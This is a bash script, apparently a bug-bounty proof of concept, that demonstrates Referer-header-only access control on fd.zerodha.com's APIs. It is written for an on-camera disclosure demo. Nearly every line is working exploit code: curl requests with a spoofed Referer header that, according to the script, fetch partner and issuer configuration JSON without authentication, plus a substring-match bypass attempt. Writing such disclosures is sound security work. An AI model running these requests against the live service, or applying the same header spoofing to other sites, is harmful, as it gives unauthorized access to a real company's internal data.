#!/usr/bin/env bash
# Zerodha BBP PoC — Referer-only access control on fd.zerodha.com (CWE-290)
# Run this ON CAMERA. It pauses after each step — read the banner aloud, press Enter.
# Total demo time: ~90 seconds. No login, no cookies, no account needed.

pause() { echo; echo ">>> Press ENTER to continue..."; read -r; }

H="https://fd.zerodha.com"

echo "=============================================="
echo " POC: Referer-only access control on fd.zerodha.com"
echo " All requests below are UNAUTHENTICATED (no cookies, no login)."
echo " Target: Zerodha FD - Com Olho program target (Moderate engagement)"
echo "=============================================="
pause

echo ""
echo "########## STEP 1: Request WITHOUT Referer header ##########"
echo "# Server rejects: 403 Invalid referer (access control is active)"
echo "# Command: curl -s $H/api/core/v1/templates/list"
echo "------------------------------------------------------------"
curl -s -m 20 "$H/api/core/v1/templates/list" | head -c 300
echo ""
pause

echo ""
echo "########## STEP 2: SAME request + spoofed Referer header ##########"
echo "# Only change: we ADD a fake Referer header typed by us."
echo "# No login. No session. No victim. Just a header WE control."
echo "# Command: curl -s $H/api/core/v1/templates/list -H 'Referer: $H/'"
echo "------------------------------------------------------------"
curl -s -m 20 "$H/api/core/v1/templates/list" -H "Referer: $H/" | head -c 500
echo ""
echo ""
echo ">>> RESULT: HTTP 200 + full partner/issuer config JSON."
echo ">>> Access control decision was made from a CLIENT-CONTROLLED header (CWE-290)."
pause

echo ""
echo "########## STEP 3: Same bypass on second endpoint (partner config) ##########"
echo "# Command: curl -s $H/api/auth/v1/public/partner/config -H 'Referer: $H/'"
echo "------------------------------------------------------------"
curl -s -m 20 "$H/api/auth/v1/public/partner/config" -H "Referer: $H/" | head -c 500
echo ""
echo ""
echo ">>> RESULT: partner UUID + internal branding/payment config disclosed."
pause

echo ""
echo "########## STEP 4: Show header is NOT validated against anything real ##########"
echo "# We send Referer from a DOMAIN WE DO NOT OWN but that ends with the right string:"
echo "# Command: ... -H 'Referer: https://not-zerodha.example.com/?x=fd.zerodha.com'"
echo "# (If this returns 200, the check is a weak substring match.)"
echo "------------------------------------------------------------"
curl -s -m 20 -o /tmp/poc_step4.out -w "HTTP_STATUS: %{http_code}\n" \
  "$H/api/core/v1/templates/list" \
  -H "Referer: https://not-zerodha.example.com/?x=fd.zerodha.com"
head -c 200 /tmp/poc_step4.out
echo ""
echo ">>> If STATUS was 403, the allowlist is strict — say that honestly on camera."
echo ">>> The bypass in Steps 2-3 (self-referer, no session) still stands either way."
pause

echo ""
echo "########## STEP 5: Prove sensitive money-paths are NOT affected (fair reporting) ##########"
echo "# Command: curl -s -X POST $H/api/core/v1/suryoday/validate-pan/start -d '{}'"
echo "# Expect: 401 Please authenticate (session still required — good)."
echo "------------------------------------------------------------"
curl -s -m 20 -X POST "$H/api/core/v1/suryoday/validate-pan/start" \
  -H "Content-Type: application/json" -H "Referer: $H/" -d '{}' | head -c 200
echo ""
echo ""
echo "=============================================="
echo " POC COMPLETE"
echo " Summary: unauthenticated API data access gated only by a spoofable"
echo " Referer header; server-side session checks remain intact elsewhere."
echo "=============================================="
